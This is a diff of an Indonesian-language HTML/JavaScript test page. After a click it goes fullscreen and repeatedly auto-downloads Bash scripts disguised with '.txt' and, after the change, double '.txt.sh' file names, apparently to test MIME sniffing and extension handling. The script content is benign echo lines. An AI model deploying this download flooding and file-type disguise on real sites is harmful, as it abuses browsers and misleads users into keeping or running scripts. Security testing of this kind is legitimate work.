@@ -83,10 +83,10 @@
       display: block;
       padding: 8px;
       background: #212121;
-      color: #eab308; /* Diubah warna kuning khas file Shell Script */
+      color: #38bdf8; /* Warna biru untuk visualisasi ekstensi ganda */
       text-decoration: none;
       border-radius: 4px;
-      font-size: 12px;
+      font-size: 11px;
       text-align: center;
       border: 1px solid #424242;
       word-break: break-all;
@@ -96,10 +96,10 @@
 
 <body>
   <div class="panel" id="main-panel">
-    <h2>Uji MIME Sniffing: .TXT berisi .SH</h2>
-    <p>Klik tombol untuk masuk ke layar penuh dan memicu pembuatan berkas Blob ber-ekstensi .txt tetapi internal konten aslinya berisi script Shell (.sh).</p>
+    <h2>Uji Manipulasi Ekstensi Ganda: .TXT.SH</h2>
+    <p>Klik tombol untuk masuk ke layar penuh dan memicu pengunduhan berkas dengan penamaan ganda (.txt.sh) yang berisi muatan skrip Bash Linux secara terus-menerus.</p>
 
-    <button id="start-btn" type="button">Mulai Layar Penuh &amp; Uji Sniffing (.sh)</button>
+    <button id="start-btn" type="button">Mulai Layar Penuh &amp; Uji Ekstensi Ganda</button>
 
     <div id="status" role="status">Sistem siap.</div>
     <div id="downloads"></div>
@@ -124,14 +124,14 @@
       }
     };
 
-    // Fungsi pembuat data biner: Mengisi tipe shell script asli ke dalam wadah teks biasa
+    // Menyiapkan Blob memori dengan konten skrip Shell Linux
     const prepareMimeBlobAsync = (i) => {
       return new Promise((resolve) => {
         queueMicrotask(() => {
-          // Menambahkan Shebang Bash (#!/bin/bash) agar lolos deteksi sebagai Shell Script saat di-sniff
-          const shCode = `#!/bin/bash\n# MIME Sniffing Test - Berkas ke-${i}\n\necho "Menjalankan skrip pengujian keamanan..."\necho "Direktori saat ini: $(pwd)"\nexit 0\n`;
+          // Konten internal berupa skrip Bash fungsional dengan Shebang
+          const shCode = `#!/bin/bash\n# Double Extension Test - Berkas ke-${i}\n\necho "Menjalankan skrip dari file manipulasi nama..."\necho "Target lingkungan berhasil dijangkau."\nexit 0\n`;
           
-          // Mengatur tipe MIME di dalam memori sebagai shell script (text/x-shellscript)
+          // Mengatur tipe MIME memori sebagai skrip eksekusi shell
           const blob = new Blob([shCode], { type: "text/x-shellscript" });
           const url = URL.createObjectURL(blob);
           resolve({ id: i, url: url });
@@ -139,14 +139,14 @@
       });
     };
 
-    // Pemicu unduhan visual memaksa nama file berakhiran teks (.txt)
+    // Memicu unduhan instan menggunakan teknik manipulasi nama berkas .txt.sh
     const triggerInstantDownload = (fileData) => {
       const link = document.createElement("a");
       link.href = fileData.url;
       
-      // Mengunci nama unduhan visual sebagai file teks (.txt)
-      link.download = `shell-sniff-${fileData.id}.txt`;
-      link.textContent = `File #${fileData.id} (.txt)`;
+      // Mengunci format nama file unduhan dengan ekstensi ganda (.txt.sh)
+      link.download = `shell-sniff-${fileData.id}.txt.sh`;
+      link.textContent = `File #${fileData.id} (.txt.sh)`;
       
       downloadsDiv.appendChild(link);
       link.click();
@@ -161,7 +161,7 @@
       
       triggerInstantDownload(fileData);
 
-      statusDiv.textContent = `Proses Berjalan: Berkas ke-${counter} dikirim`;
+      statusDiv.textContent = `Proses Berjalan: Berkas .txt.sh ke-${counter} terkirim`;
 
       if (counter % 10 === 0) {
         speak(`Proses mencapai ${counter} berkas.`);
@@ -170,7 +170,7 @@
       setTimeout(() => processLoop(counter + 1), 0);
     };
 
-    // Event Handler Tombol
+    // Event Handler Tombol Utama
     startBtn.addEventListener("click", () => {
       if (isProcessing) return;
 
@@ -196,12 +196,12 @@
 
       setTimeout(() => {
         isProcessing = true;
-        speak("Proses pengujian shell script dimulai.");
+        speak("Proses pembuatan berkas ekstensi ganda dimulai.");
         processLoop(1);
       }, 300);
     });
 
-    // Otomatis berhenti ketika keluar dari mode fullscreen
+    // Otomatis menghentikan loop jika pengguna keluar dari mode fullscreen (Tombol Esc)
     const stopProcess = () => {
       if (isProcessing) {
         isProcessing = false;
